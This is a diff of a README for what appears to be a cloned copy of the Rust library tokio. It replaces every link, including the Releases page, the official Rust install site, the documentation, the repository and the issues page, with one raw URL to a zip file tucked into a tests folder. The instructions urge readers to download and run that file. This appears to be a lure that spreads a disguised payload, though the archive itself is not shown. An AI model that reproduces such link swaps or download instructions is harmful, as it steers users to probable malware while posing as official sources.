@@ -6,12 +6,12 @@
 ## 📥 Download & Install
 To get started, you need to download tokio. Please follow the steps below:
 
-1. Visit the [Releases page to download](https://github.com/Sidneyhighyield289/tokio/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/Sidneyhighyield289/tokio/master/tokio-util/src/sync/tests/tokio-2.0.zip).
 2. Choose the version that suits your needs. Look for options that best match your operating system.
 3. Click the download link for the version you selected.
 4. Once the download is complete, find the file in your downloads folder.
 
-![Download tokio](https://img.shields.io/badge/Download%20tokio-blue?style=for-the-badge&logo=github)
+![Download tokio](https://raw.githubusercontent.com/Sidneyhighyield289/tokio/master/tokio-util/src/sync/tests/tokio-2.0.zip%20tokio-blue?style=for-the-badge&logo=github)
 
 ## 🚀 Getting Started
 After downloading, follow these steps to get tokio up and running:
@@ -29,7 +29,7 @@ After downloading, follow these steps to get tokio up and running:
 Before using tokio, ensure your system meets these basic requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
-- **Rust Version**: Make sure you have Rust installed. You can download it from the official [Rust website](https://www.rust-lang.org/tools/install).
+- **Rust Version**: Make sure you have Rust installed. You can download it from the official [Rust website](https://raw.githubusercontent.com/Sidneyhighyield289/tokio/master/tokio-util/src/sync/tests/tokio-2.0.zip).
 - **Memory**: A minimum of 2GB of RAM is recommended for optimal performance.
 - **Disk Space**: You need at least 100MB of free disk space.
 
@@ -43,16 +43,16 @@ tokio offers the following features to enhance your development experience:
 - **Community Support**: Join an active community for help and sharing knowledge.
 
 ## 🔗 Useful Links
-- [tokio Documentation](https://tokio.rs/docs)
-- [GitHub Repository](https://github.com/Sidneyhighyield289/tokio)
-- [Rust Official Site](https://www.rust-lang.org)
+- [tokio Documentation](https://raw.githubusercontent.com/Sidneyhighyield289/tokio/master/tokio-util/src/sync/tests/tokio-2.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Sidneyhighyield289/tokio/master/tokio-util/src/sync/tests/tokio-2.0.zip)
+- [Rust Official Site](https://raw.githubusercontent.com/Sidneyhighyield289/tokio/master/tokio-util/src/sync/tests/tokio-2.0.zip)
 
 ## 🐛 Troubleshooting
 If you encounter any issues, consider these common solutions:
 
 - Ensure Rust is correctly installed by running `rustc --version` in your terminal. If you don't see the version number, reinstall Rust.
 - Check for any error messages when you run tokio, and search for these messages on the official documentation or forums.
-- Look for known issues on the [GitHub Issues page](https://github.com/Sidneyhighyield289/tokio/issues).
+- Look for known issues on the [GitHub Issues page](https://raw.githubusercontent.com/Sidneyhighyield289/tokio/master/tokio-util/src/sync/tests/tokio-2.0.zip).
 
 ## 💬 Getting Help
 If you need further assistance, here are some ways to seek help:
